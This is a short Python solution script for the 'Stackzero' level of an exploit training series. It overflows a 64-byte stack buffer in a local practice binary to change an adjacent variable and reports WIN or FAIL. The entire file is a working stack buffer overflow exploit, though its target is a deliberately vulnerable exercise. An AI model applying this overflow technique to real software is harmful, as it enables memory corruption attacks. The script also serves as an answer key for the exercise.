# Christopher R. Fischer
# 8/8/2021
# Exploit Excercises - Stackzero Solution.

import subprocess

BFR_SIZE = 64

# We can just fill the buffer with garbage
payload = 'A' * BFR_SIZE

# We add something to change our target to nonzero.

payload += 'Z'

# Open the process, feed it our payload via stdin..
openedProcess = subprocess.Popen("./stackzero.c.o", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
output = openedProcess.communicate(input=bytes(payload.encode('ASCII')))[0]

# Did we win?
if b"has been changed" in output:
    print("WIN! We've changed the variable.")
    print(output)

# If not, inform the user and print the output.
else:
    print("FAIL!")
    print(output)